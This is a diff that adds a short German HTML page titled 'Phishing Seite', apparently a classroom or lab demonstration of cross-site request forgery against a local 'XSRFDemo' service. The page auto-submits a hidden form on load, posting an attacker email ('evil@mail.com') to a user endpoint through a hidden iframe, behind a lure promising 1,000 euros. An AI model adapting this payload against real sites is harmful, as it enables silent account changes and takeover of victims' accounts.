@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<!--
+To change this license header, choose License Headers in Project Properties.
+To change this template file, choose Tools | Templates
+and open the template in the editor.
+-->
+<html>
+
+<head>
+    <title>Phishing Seite</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+    <h1>Du bist ganz sicher hier</h1>
+    <form action="http://localhost:8080/XSRFDemo/rest/user" method="POST" target="transFrame">
+        <input type="hidden" name="mail" value="evil@mail.com" />
+        <button type="submit" id="btn">klick hier und erhalte sofort 1.000 Euro</button>
+    </form>
+
+    <iframe style="display: none;" name="transFrame" id="transFrame"></iframe>
+    <script>
+        document.getElementById('btn').click();
+    </script>
+</body>
+
+</html>
